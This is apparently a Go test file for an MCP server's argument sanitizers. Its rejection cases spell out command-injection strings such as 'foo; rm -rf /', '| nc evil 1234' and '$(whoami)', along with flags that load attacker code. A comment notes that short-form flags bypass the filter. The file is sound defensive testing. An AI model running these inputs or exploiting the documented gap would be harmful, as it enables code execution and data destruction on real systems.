package mcp

import (
	"errors"
	"strings"
	"testing"
)

func TestSanitizeTestArgs_AcceptsBenign(t *testing.T) {
	cases := [][]string{
		nil,
		{},
		{"-v"},
		{"--verbose"},
		{"-count=1"},
		{"-race"},
		{"./..."},
		{"-run", "TestFoo"},
		{"--", "extra"},
	}
	for _, args := range cases {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			if err := SanitizeTestArgs(args); err != nil {
				t.Errorf("expected ok for %v, got %v", args, err)
			}
		})
	}
}

func TestSanitizeTestArgs_RejectsDangerous(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		// pytest pivots (long form)
		{"pytest rootdir", []string{"--rootdir=/tmp/evil"}},
		{"pytest import-mode", []string{"--import-mode=importlib"}},
		{"pytest cov-config", []string{"--cov-config", "/tmp/evil.cfg"}},
		{"pytest plugin long", []string{"--plugin", "evilplugin"}},
		// generic config-path overrides
		{"generic --config", []string{"--config=/tmp/evil"}},
		{"generic --config-file", []string{"--config-file=/tmp/x"}},
		// gradle / mvn code exec
		{"gradle init-script long", []string{"--init-script=/tmp/init.gradle"}},
		{"mvn -D system property", []string{"-Dexec.executable=/bin/sh"}},
		{"gradle -I init", []string{"-Iscript.gradle"}},
		{"gradle -P prop", []string{"-Pkey=value"}},
		// cargo
		{"cargo manifest pivot", []string{"--manifest-path=/tmp/Cargo.toml"}},
		{"cargo target dir", []string{"--target-dir=/tmp/x"}},
		// node
		{"node --require", []string{"--require=/tmp/evil.js"}},
		{"node options env", []string{"--node-options=--require=/tmp/evil.js"}},
		{"node inspect", []string{"--inspect-brk=0.0.0.0:9229"}},
		{"node loader", []string{"--loader=/tmp/evil.mjs"}},
		// generic eval
		{"generic --eval", []string{"--eval=evil()"}},
		{"generic --exec", []string{"--exec=/bin/sh"}},
		// dotnet
		{"dotnet runsettings", []string{"--runsettings", "/tmp/evil.runsettings"}},
		// shell metacharacters
		{"backtick", []string{"`whoami`"}},
		{"dollar paren", []string{"$(whoami)"}},
		{"semicolon chain", []string{"foo; rm -rf /"}},
		{"pipe", []string{"foo | nc evil 1234"}},
		{"redir", []string{"foo > /tmp/x"}},
		{"newline", []string{"foo\nrm -rf /"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := SanitizeTestArgs(tc.args)
			if err == nil {
				t.Fatalf("expected rejection for %v, got nil", tc.args)
			}
			var sErr *SanitizationError
			if !errors.As(err, &sErr) {
				t.Errorf("expected *SanitizationError, got %T", err)
			}
		})
	}
}

func TestSanitizeTestArgs_RejectsControlChars(t *testing.T) {
	if err := SanitizeTestArgs([]string{"foo\x00bar"}); err == nil {
		t.Error("expected rejection of null byte")
	}
}

// TestSanitizeTestArgs_AcceptsResidualRiskShortFlags documents short-form
// flags whose semantics conflict with common Go test flags (-count, -cover,
// -race, -run, -parallel, -cpu, etc.). We accept the residual risk that an
// attacker uses `-p evilplugin` (pytest), `-r /tmp/evil.js` (node), `-c
// /tmp/evil.toml`, or `-e evil()` instead of the long form, which IS blocked.
// Mitigation: the long form is the form LLMs typically produce; short forms
// require deliberate attacker effort and are caught by code review of the
// agent's tool-call payloads.
func TestSanitizeTestArgs_AcceptsResidualRiskShortFlags(t *testing.T) {
	for _, args := range [][]string{
		{"-p", "evilplugin"},
		{"-r", "/tmp/evil.js"},
		{"-c", "/tmp/evil.toml"},
		{"-e", "evil()"},
	} {
		if err := SanitizeTestArgs(args); err != nil {
			t.Errorf("policy says short-form %v is accepted residual risk; got rejection %v", args, err)
		}
	}
}

func TestSanitizeTags_Accepts(t *testing.T) {
	for _, tags := range []string{"", "integration", "integration,e2e", "tag_1,tag_2"} {
		if err := SanitizeTags(tags); err != nil {
			t.Errorf("expected ok for %q, got %v", tags, err)
		}
	}
}

func TestSanitizeTags_Rejects(t *testing.T) {
	for _, tags := range []string{"a;b", "a b", "a$b", "a/b", "../../../etc"} {
		if err := SanitizeTags(tags); err == nil {
			t.Errorf("expected rejection for %q", tags)
		}
	}
}

func TestSanitizeRunPattern_Accepts(t *testing.T) {
	for _, pat := range []string{"", "TestFoo", "Test.*", "^Test[A-Z].*$", "TestA|TestB"} {
		if err := SanitizeRunPattern(pat); err != nil {
			t.Errorf("expected ok for %q, got %v", pat, err)
		}
	}
}

func TestSanitizeRunPattern_Rejects(t *testing.T) {
	for _, pat := range []string{"`whoami`", "$(id)", "foo;bar", "foo\nbar", "foo&bar"} {
		if err := SanitizeRunPattern(pat); err == nil {
			t.Errorf("expected rejection for %q", pat)
		}
	}
}

func TestSanitizeTimeout_Accepts(t *testing.T) {
	for _, to := range []string{"", "10m", "1h", "500ms", "30s", "1h30m", "100us"} {
		if err := SanitizeTimeout(to); err != nil {
			t.Errorf("expected ok for %q, got %v", to, err)
		}
	}
}

func TestSanitizeTimeout_Rejects(t *testing.T) {
	for _, to := range []string{"10m; rm -rf /", "$(echo 1)", "10minutes", "abc", "10m`whoami`"} {
		if err := SanitizeTimeout(to); err == nil {
			t.Errorf("expected rejection for %q", to)
		}
	}
}

func TestSanitizeBuildFlagsInput_FailFast(t *testing.T) {
	err := SanitizeBuildFlagsInput("bad tag", "", "", nil)
	if err == nil || !strings.Contains(err.Error(), "tags") {
		t.Errorf("expected tags error, got %v", err)
	}

	err = SanitizeBuildFlagsInput("ok", "$(evil)", "", nil)
	if err == nil || !strings.Contains(err.Error(), "run") {
		t.Errorf("expected run error, got %v", err)
	}

	err = SanitizeBuildFlagsInput("ok", "TestFoo", "10minutes", nil)
	if err == nil || !strings.Contains(err.Error(), "timeout") {
		t.Errorf("expected timeout error, got %v", err)
	}

	err = SanitizeBuildFlagsInput("ok", "TestFoo", "10m", []string{"--rootdir=/tmp"})
	if err == nil || !strings.Contains(err.Error(), "testArgs") {
		t.Errorf("expected testArgs error, got %v", err)
	}

	if err := SanitizeBuildFlagsInput("integration,e2e", "TestFoo", "30s", []string{"-v", "./..."}); err != nil {
		t.Errorf("expected all-ok, got %v", err)
	}
}

func TestSanitizationError_Message(t *testing.T) {
	err := &SanitizationError{Field: "x", Value: "y", Reason: "z"}
	msg := err.Error()
	for _, want := range []string{"x", "y", "z"} {
		if !strings.Contains(msg, want) {
			t.Errorf("message %q missing %q", msg, want)
		}
	}
}

func TestHandleCheck_RejectsInjectedTestArgs(t *testing.T) {
	svc := &mockService{}
	server := New(svc, DefaultConfig(), "test")

	out, err := server.handleCheck(t.Context(), CheckInput{
		TestArgs: []string{"--rootdir=/tmp/evil"},
	})
	if err != nil {
		t.Fatalf("handler returned err: %v", err)
	}
	if passed, _ := out["passed"].(bool); passed {
		t.Error("expected passed=false on sanitization rejection")
	}
	if errStr, _ := out["error"].(string); !strings.Contains(errStr, "rootdir") {
		t.Errorf("expected rootdir in error, got %q", errStr)
	}
	if svc.checkOpts.Profile != "" || len(svc.checkOpts.BuildFlags.TestArgs) != 0 {
		t.Error("service was called despite sanitization rejection")
	}
}

func TestHandleRecord_RejectsInjectedTestArgs(t *testing.T) {
	svc := &mockService{}
	server := New(svc, DefaultConfig(), "test")

	out, err := server.handleRecord(t.Context(), RecordInput{
		TestArgs: []string{"-Dexec.executable=/bin/sh"},
	})
	if err != nil {
		t.Fatalf("handler returned err: %v", err)
	}
	if passed, _ := out["passed"].(bool); passed {
		t.Error("expected passed=false on sanitization rejection")
	}
	if svc.recordOpts.ProfilePath != "" {
		t.Error("service was called despite sanitization rejection")
	}
}
